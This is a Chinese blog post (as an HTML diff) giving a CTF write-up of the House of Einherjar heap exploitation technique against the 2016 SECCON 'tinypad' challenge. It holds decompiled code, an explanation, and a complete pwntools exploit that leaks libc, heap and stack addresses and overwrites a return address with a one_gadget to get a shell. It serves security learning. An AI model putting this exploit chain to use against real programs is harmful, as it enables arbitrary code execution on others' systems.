@@ -1,0 +1,482 @@
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of einherjar | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of einherjar</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-10T15:14:29.000Z" id="date"> 2023-04-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-11T15:16:46.488Z" id="updated"> 2023-09-11</time></div></span></div></div><hr><div id="post-content"><h1 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>释放堆块时，unlink后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。</p>
+<p>free 函数中的后向合并核心操作如下</p>
+<pre><code>    /* consolidate backward */
+    if (!prev_inuse(p)) {
+        prevsize = prev_size(p);
+        size += prevsize;
+        p = chunk_at_offset(p, -((long) prevsize));
+        unlink(av, p, bck, fwd);
+    }
+</code></pre>
+<blockquote>
+<p>后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize))<br class='item-img' data-src='https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/9b846f8b786542daa1c92131e0870ab3.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
+</blockquote>
+<h2 id="思路1：两个chunk通过后向unlink直接实现任意地址写"><a href="#思路1：两个chunk通过后向unlink直接实现任意地址写" class="headerlink" title="思路1：两个chunk通过后向unlink直接实现任意地址写"></a>思路1：两个chunk通过后向unlink直接实现任意地址写</h2><p>假设有两个连续的chunk，我们利用低地址的chunk将高地址 chunk 的 prev_size 写为目标地址与当前地址的差值，free后合并，再malloc，就可以申请到目标地址的chunk，实现任意地址写，但是需要在目的 chunk 附近构造相应的 fake chunk，fake_chunk的size字段，必须和chunk_b的pre_size字段一致，为二者之间的偏移量，从而绕过 unlink 的检测。</p>
+<h2 id="思路2：三个chunk通过后向unlink实现double-free"><a href="#思路2：三个chunk通过后向unlink实现double-free" class="headerlink" title="思路2：三个chunk通过后向unlink实现double free"></a>思路2：三个chunk通过后向unlink实现double free</h2><pre><code>chunk_0  0xD0    # 堆块大小需要保证释放后不进入tcache bin和fastbin，即存在tcache需要先填满对应的tcache 
+chunk_1  0x18    # 堆块大小以8结尾，保证off by null可以覆盖到下一个堆块的prev_inuse
+chunk_2  0xD0    # 堆块大小的最后一个字节必须为00，也就是上一个堆块覆盖prev_inuse后不会影响该堆块的大小
+chunk_3  0x10    # 堆块大小任意，防止前面的堆块合并到Top chunk中
+</code></pre>
+<p>申请四个chunk，第四个chunk用来将前三个chunk与top chunk隔开（防止free前三个chunk后与top chunk合并），先free(chunk_0)，利用off-by-null修改第2个chunk的mem，将第三个chunk的的prev_size修改为前两个chunk大小之和，然后free(chunk_2)，将chunk_0,chunk_1,chunk_2合并，之后申请chunk_0大小和chunk_1大小的chunk，再free(chunk_1),free(chunk_5)，实际chunk_1和chunk_5是同一个chunk，从而实现double free。</p>
+<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="2016-seccon-tinypad"><a href="#2016-seccon-tinypad" class="headerlink" title="2016_seccon_tinypad"></a>2016_seccon_tinypad</h3><p class='item-img' data-src='https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/803d17adef39414caf3dbcc00a7a677a.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/2c675a4984ad4676818af16848b058bf.png?ynotemdtimestamp=1663776476851" alt="img"></p>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/32b875e635b2480e8d54952a02777e2f.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>运行程序发现有四个功能：增删改退，分别用a,d,e,q进行操作，并且每次进行一次操作，程序会把每个chunk的内容输出出来，根据ida伪代码发现只能最多申请4个chunk<br class='item-img' data-src='https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/845fc9c4bc3e4c9fb506077a5df0f2f0.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
+<h4 id="ida伪代码"><a href="#ida伪代码" class="headerlink" title="ida伪代码"></a>ida伪代码</h4><p>主函数</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rax
+  int choice; // eax
+  int v5; // eax
+  __int64 v6; // rax
+  size_t v7; // rax
+  int c; // [rsp+4h] [rbp-1Ch] BYREF
+  int i; // [rsp+8h] [rbp-18h]
+  int index; // [rsp+Ch] [rbp-14h]
+  int v12; // [rsp+10h] [rbp-10h]
+  int v13; // [rsp+14h] [rbp-Ch]
+  unsigned __int64 v14; // [rsp+18h] [rbp-8h]
+
+  v14 = __readfsqword(0x28u);
+  v12 = 0;
+  write_n(&amp;unk_4019F0, 1uLL);
+  write_n(
+    "  ============================================================================\n"
+    "// _|_|_|_|_|  _|_|_|  _|      _|  _|      _|  _|_|_|      _|_|    _|_|_|     \\\\\n"
+    "||     _|        _|    _|_|    _|    _|  _|    _|    _|  _|    _|  _|    _|   ||\n"
+    "||     _|        _|    _|  _|  _|      _|      _|_|_|    _|_|_|_|  _|    _|   ||\n"
+    "||     _|        _|    _|    _|_|      _|      _|        _|    _|  _|    _|   ||\n"
+    "\\\\     _|      _|_|_|  _|      _|      _|      _|        _|    _|  _|_|_|     //\n"
+    "  ============================================================================\n",
+    563uLL);
+  write_n(&amp;unk_4019F0, 1uLL);
+  do
+  {
+    for ( i = 0; i &lt;= 3; ++i )
+    {
+      LOBYTE(c) = i + 49;
+      writeln("+------------------------------------------------------------------------------+\n", 81LL);
+      write_n(" #   INDEX: ", 12uLL);
+      writeln(&amp;c, 1LL);
+      write_n(" # CONTENT: ", 12uLL);
+      if ( *&amp;tinypad[16 * i + 264] )
+      {
+        v3 = strlen(*&amp;tinypad[16 * i + 264]);
+        writeln(*&amp;tinypad[16 * i + 264], v3);
+      }
+      writeln(&amp;unk_4019F0, 1LL);
+    }
+    index = 0;
+    choice = getcmd();
+    v12 = choice;
+    if ( choice == 68 )
+    {
+      write_n("(INDEX)&gt;&gt;&gt; ", 11uLL);
+      index = read_int();
+      if ( index &lt;= 0 || index &gt; 4 )            // 只能申请四个chunk
+                                                // 
+      {
+LABEL_29:
+        writeln("Invalid index", 13LL);
+        continue;
+      }
+      if ( !*&amp;tinypad[16 * index + 240] )
+      {
+LABEL_31:
+        writeln("Not used", 8LL);
+        continue;
+      }
+      free(*&amp;tinypad[16 * index + 248]);
+      *&amp;tinypad[16 * index + 240] = 0LL;        // size置为0，头指针未置为0
+      writeln("\nDeleted.", 9LL);      					//uaf
+    }
+    else if ( choice &gt; 0x44 )
+    {
+      if ( choice != 0x45 )
+      {
+        if ( choice == 81 )
+          continue;
+LABEL_41:
+        writeln("No such a command", 17LL);
+        continue;
+      }
+      write_n("(INDEX)&gt;&gt;&gt; ", 11uLL);
+      index = read_int();
+      if ( index &lt;= 0 || index &gt; 4 )
+        goto LABEL_29;
+      if ( !*&amp;tinypad[16 * index + 240] )
+        goto LABEL_31;
+      c = 48;
+      strcpy(tinypad, *&amp;tinypad[16 * index + 248]);
+      while ( toupper(c) != 89 )
+      {
+        write_n("CONTENT: ", 9uLL);
+        v6 = strlen(tinypad);
+        writeln(tinypad, v6);
+        write_n("(CONTENT)&gt;&gt;&gt; ", 13uLL);
+        v7 = strlen(*&amp;tinypad[16 * index + 248]);
+        read_until(tinypad, v7, 10u);
+        writeln("Is it OK?", 9LL);
+        write_n("(Y/n)&gt;&gt;&gt; ", 9uLL);
+        read_until(&amp;c, 1uLL, 10u);
+      }
+      strcpy(*&amp;tinypad[16 * index + 248], tinypad);
+      writeln("\nEdited.", 8LL);
+    }
+    else
+    {
+      if ( choice != 65 )
+        goto LABEL_41;
+      while ( index &lt;= 3 &amp;&amp; *&amp;tinypad[16 * index + 256] )
+        ++index;
+      if ( index == 4 )
+      {
+        writeln("No space is left.", 17LL);
+      }
+      else
+      {
+        v13 = -1;
+        write_n("(SIZE)&gt;&gt;&gt; ", 10uLL);
+        v13 = read_int();
+        if ( v13 &lt;= 0 )
+        {
+          v5 = 1;
+        }
+        else
+        {
+          v5 = v13;
+          if ( v13 &gt; 0x100 )
+            v5 = 256;
+        }
+        v13 = v5;
+        *&amp;tinypad[16 * index + 256] = v5;
+        *&amp;tinypad[16 * index + 264] = malloc(v13);
+        if ( !*&amp;tinypad[16 * index + 264] )
+        {
+          writerrln("[!] No memory is available.", 27LL);
+          exit(-1);
+        }
+        write_n("(CONTENT)&gt;&gt;&gt; ", 13uLL);
+        read_until(*&amp;tinypad[16 * index + 264], v13, 10u);
+        writeln("\nAdded.", 7LL);
+      }
+    }
+  }
+  while ( v12 != 81 );
+  return 0;
+}
+</code></pre>
+<h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/36cbf32b34ff4763bc3c8ee7d005d707.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/f979860f82c140b0ac13547f4c6ab391.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
+<pre><code>    *&amp;tinypad[16 * index + 0x100] = v5;
+    *&amp;tinypad[16 * index + 264] = malloc(v13);
+</code></pre>
+<p>存在chunk全局数组，起始地址从0x602040+16*0+0x100=0x602140 开始依次存放chunk的size大小和头指针</p>
+<h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e19c3dd623844a70a68224c7f7ac2b22.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/5484173e0ffe4c4699251e0073885c26.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>该edit函数调用的read_until函数存在off-by-null漏洞</p>
+<h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p class='item-img' data-src='https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/46d199c2d35b49b3b638f8edd4fdf44d.png?ynotemdtimestamp=1663776476851" alt="img"><br>free函数存在uaf漏洞</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先泄露libc和heap地址</p>
+<p>利用 house of einherjar 方法在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</p>
+<p>这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。不能覆盖malloc_hook</p>
+<pre><code>v6 = strlen(tinypad);
+</code></pre>
+<p>可以泄露出environ 的地址，通过gdb调试进而求得存储 main 函数的返回地址的地址，将main 函数的返回地址覆盖为one_gadget来获得shell</p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>先把前面的代码写好</p>
+<pre><code># coding=utf-8
+from pwn import*
+context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
+sh = process('./tinypad')
+libc = ELF('//home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')
+
+#命令简写化
+s       = lambda data               :sh.send(data)
+sa      = lambda delim,data         :sh.sendafter(delim, data)
+sl      = lambda data               :sh.sendline(data)
+sla     = lambda delim,data         :sh.sendlineafter(delim, data)
+r       = lambda num=4096           :sh.recv(num)
+ru      = lambda delims             :sh.recvuntil(delims)
+itr     = lambda                    :sh.interactive()
+uu32    = lambda data               :u32(data.ljust(4,'\0'))
+uu64    = lambda data               :u64(data.ljust(8,'\0'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
+#定义gdb调试函数
+def dbg():
+        gdb.attach(sh)
+        pause()
+
+def add(size, content='a'):
+    sla('(CMD)&gt;&gt;&gt; ','a')
+    sla('(SIZE)&gt;&gt;&gt; ',str(size))
+    sla('(CONTENT)&gt;&gt;&gt; ',content)
+
+
+
+def edit(idx, content):
+    sla('(CMD)&gt;&gt;&gt; ','e')
+    sla('(INDEX)&gt;&gt;&gt; ',str(idx))
+    sla('(CONTENT)&gt;&gt;&gt; ',content)
+    sla('Is it OK?\n','Y')
+   
+
+
+def free(idx):
+    sla('(CMD)&gt;&gt;&gt; ','d')
+    sla('(INDEX)&gt;&gt;&gt; ',str(idx))
+
+def exit():
+    sla('(CMD)&gt;&gt;&gt; ','Q')
+</code></pre>
+<p>先申请四个chunk，free(3)和free(1),堆块大于0x7f，所以会进入unsorted bin里，chunk是从1开始计数的，此时chunk_1里存放的就是chunk_3的头指针和main_arena+88的地址，chunk_3的头指针前面有两个大小为(0x100+0x10)的chunk，减去(0x100+0x10)*2就是heap的基地址，之后计算出main_arena+88与libc基地址的距离（这个距离是固定的）0x7f19d3ef7b78−0x7f19d3b33000=0x3C4B78</p>
+<pre><code>add(0x100)
+add(0x100)
+add(0x100)
+add(0x100)
+
+free(3)
+free(1)
+ru('INDEX: 1')
+ru('CONTENT: ')
+heapbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) -(0x100+0x10)*2
+ru('INDEX: 3')
+ru('CONTENT: ')
+libcbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) - 0x3C4B78
+environ = libc.sym['environ']+libcbase
+lg('heapbase',heapbase)
+lg('libcbase',libcbase)
+
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/2c42cb785bac44009458a23a58d7351a.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/e4a80c077a944e0aaf438d8d41d87caf.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
+<p>在 tinypad 的前0x100字节中伪造 chunk。当我们再次申请时，那么就可以控制4个 memo 的指针和内容了。</p>
+<pre><code>add(0x100)
+add(0x100)
+
+#dbg()
+
+#四个chunk与top chunk合并
+free(4)
+free(1)
+free(2)
+free(3)
+
+#dbg()
+#empty now 
+
+add(0x100,'a'*0x100)
+edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))
+
+#dbg()
+
+
+free(1)
+
+
+add(0x10) #1
+add(0xf0) #2
+add(0x10) #3
+add(0x100,'a'*0x100) #4
+</code></pre>
+<p>之后free(1)，再申请0x18大小的chunk_1，利用add函数里自定义的read函数的off-by-null，可以将chunk_2的pre_size改为chunk数组附近0x602070处，再次free(2)，这样利用House of einherjar，可以将free的 chunk转移到0x602070（chunk_2的头指针）处，就可以0x602040（chunk_1的头指针）处形成我们提前构造好的chunk</p>
+<pre><code>#edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))
+
+
+free(1)
+target = heapbase+0x20-0x602070
+add(0x18,b'a'*0x10+p64(target)) #1
+
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e81bf64023f74d5c8fbec47c042304c2.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>再free（2），编辑chunk_4就相当于在0x602040处的chunk开始编辑，将</p>
+<pre><code>free(2)
+
+edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)
+
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/716576b4406d4a1ca57028748e1549e4.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/e9b6cca861874a2e970bba4d84c1e939.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
+<p>再申请0xf0大小的chunk（实际大小为0x100），此时申请的chunk就在0x602070处，而该chunk的mem区域与chunk全局数组起始地址0x602140相差（0x602140-0x602070+0x10）=0xc0，用字符a填充，之后按照chunk size+头指针依次填充全局数组，将chunk_1改为environ地址，chunk2改为0x602148地址（也就是存放environ地址的地址）</p>
+<pre><code>add(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))
+ru('INDEX: 1')
+ru('CONTENT: ')
+stack= u64(ru('\n')[:-1].ljust(8,b'\x00'))
+target =  -0xF0 + stack 
+lg('stack',stack)
+lg('target',target)
+#0x7fc7dd85ff38 &lt;environ&gt;:	0x00007ffc91b85d58	0x0000000000000000
+#1e:00f0│       0x7ffc91b85c68 —▸ 0x7fc7dd4b9830 (__libc_start_main+240) ◂— mov    edi, eax
+#  0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/eb9b6db414da4794933e15619b64eaff.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
+<p>泄露出来的chunk_1的内容就是栈地址 stack=0x00007ffc91b85d58，在查看栈区main函数返回地址0x7ffc91b85c68，0x7ffc91b85c68-0x00007ffc91b85d58=-0xF0，所以我们要覆盖的main函数返回地址为target = -0xF0 + stack<br class='item-img' data-src='https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/4687391ea27f4699bfb42ba822df650c.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/a18627ab0eb547b78e2ed5bba19b75cf.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"><br>刚才我们把chunk_2的mem指向了chunk_1的mem指针，编辑chunk_2为target地址，把chunk_1的mem指针改为target地址，这时再次编辑chunk_1为one_gadget地址，就把target地址存放的main函数返回地址改为了exeve(“/bin/sh\x00”)，再退出程序，获得shell</p>
+<pre><code>edit(2,p64(target))
+one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
+shell = one_gadget[0] + libcbase
+edit(1,p64(shell))
+exit()
+itr()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png?ynotemdtimestamp=1663776476851'><img src="https://img-blog.csdnimg.cn/7446788a5c9e455c8c7e3820ac52216c.png?ynotemdtimestamp=1663776476851" alt="在这里插入图片描述"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code># coding=utf-8
+from pwn import*
+context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
+sh = process('./tinypad')
+libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')
+
+#命令简写化
+s       = lambda data               :sh.send(data)
+sa      = lambda delim,data         :sh.sendafter(delim, data)
+sl      = lambda data               :sh.sendline(data)
+sla     = lambda delim,data         :sh.sendlineafter(delim, data)
+r       = lambda num=4096           :sh.recv(num)
+ru      = lambda delims             :sh.recvuntil(delims)
+itr     = lambda                    :sh.interactive()
+uu32    = lambda data               :u32(data.ljust(4,'\0'))
+uu64    = lambda data               :u64(data.ljust(8,'\0'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
+#定义gdb调试函数
+def dbg():
+        gdb.attach(sh)
+        pause()
+
+def add(size, content='a'):
+    sla('(CMD)&gt;&gt;&gt; ','a')
+    sla('(SIZE)&gt;&gt;&gt; ',str(size))
+    sla('(CONTENT)&gt;&gt;&gt; ',content)
+
+
+
+def edit(idx, content):
+    sla('(CMD)&gt;&gt;&gt; ','e')
+    sla('(INDEX)&gt;&gt;&gt; ',str(idx))
+    sla('(CONTENT)&gt;&gt;&gt; ',content)
+    sla('Is it OK?\n','Y')
+   
+
+
+def free(idx):
+    sla('(CMD)&gt;&gt;&gt; ','d')
+    sla('(INDEX)&gt;&gt;&gt; ',str(idx))
+
+def exit():
+    sla('(CMD)&gt;&gt;&gt; ','Q')
+     
+add(0x100)
+add(0x100)
+add(0x100)
+add(0x100)
+
+free(3)
+free(1)
+ru('INDEX: 1')
+ru('CONTENT: ')
+heapbase = u64(ru('\n')[:-1].ljust(8,b'\x00')) -(0x100+0x10)*2
+ru('INDEX: 3')
+ru('CONTENT: ')
+main_arena_88 = u64(ru('\n')[:-1].ljust(8,b'\x00')) 
+libcbase = main_arena_88-0x3C4B78
+environ = libc.sym['environ']+libcbase
+lg('heapbase',heapbase)
+lg('libcbase',libcbase)
+
+#dbg()
+
+add(0x100)
+add(0x100)
+
+#dbg()
+
+#四个chunk与top chunk合并
+free(4)
+free(1)
+free(2)
+free(3)
+
+#dbg()
+#empty now 
+
+add(0x100,'a'*0x100)
+edit(1,b'a'*0x30+p64(0)+p64(0x41)+p64(0x602070)*2+b'\x00'*0x20+p64(0x40))
+
+#dbg()
+
+free(1)
+
+add(0x10) #1
+add(0xf0) #2
+add(0x10) #3
+add(0x100,'a'*0x100) #4
+
+#dbg()
+
+free(1)
+
+#dbg()
+
+target = heapbase+0x20-0x602070
+add(0x18,b'a'*0x10+p64(target)) #1
+
+
+free(2)
+
+#dbg()
+
+edit(4,b'a'*0x30+p64(0)+p64(0x101)+p64(main_arena_88)*2)
+
+#dbg()
+
+add(0xf0,b'a'*0xc0+p64(0x100)+p64(environ)+p64(0x100)+p64(0x602148))
+ru('INDEX: 1')
+ru('CONTENT: ')
+stack= u64(ru('\n')[:-1].ljust(8,b'\x00'))
+target =  -0xF0 + stack 
+lg('stack',stack)
+lg('target',target)
+#0x7f825ab56f38 &lt;environ&gt;:	0x00007ffe282d8c28	0x0000000000000000
+#00:0000│  0x7ffe282d8b38 —▸ 0x7f825a7b0830 (__libc_start_main+240) ◂— mov    edi, eax
+#  0x7ffe282d8b38-0x00007ffe282d8c28=-0xF0
+#dbg()
+
+edit(2,p64(target))
+one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
+shell = one_gadget[0] + libcbase
+edit(1,p64(shell))
+exit()
+ 
+itr()
+</code></pre>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Force/">← Next House Of Force</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Orange/">House Of Orange Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">枕木</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Einherjar"><span class="toc-number">1.</span> <span class="toc-text">House of Einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF1%EF%BC%9A%E4%B8%A4%E4%B8%AAchunk%E9%80%9A%E8%BF%87%E5%90%8E%E5%90%91unlink%E7%9B%B4%E6%8E%A5%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">1.2.</span> <span class="toc-text">思路1：两个chunk通过后向unlink直接实现任意地址写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF2%EF%BC%9A%E4%B8%89%E4%B8%AAchunk%E9%80%9A%E8%BF%87%E5%90%8E%E5%90%91unlink%E5%AE%9E%E7%8E%B0double-free"><span class="toc-number">1.3.</span> <span class="toc-text">思路2：三个chunk通过后向unlink实现double free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">例题：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2016-seccon-tinypad"><span class="toc-number">1.4.1.</span> <span class="toc-text">2016_seccon_tinypad</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ida%E4%BC%AA%E4%BB%A3%E7%A0%81"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">ida伪代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 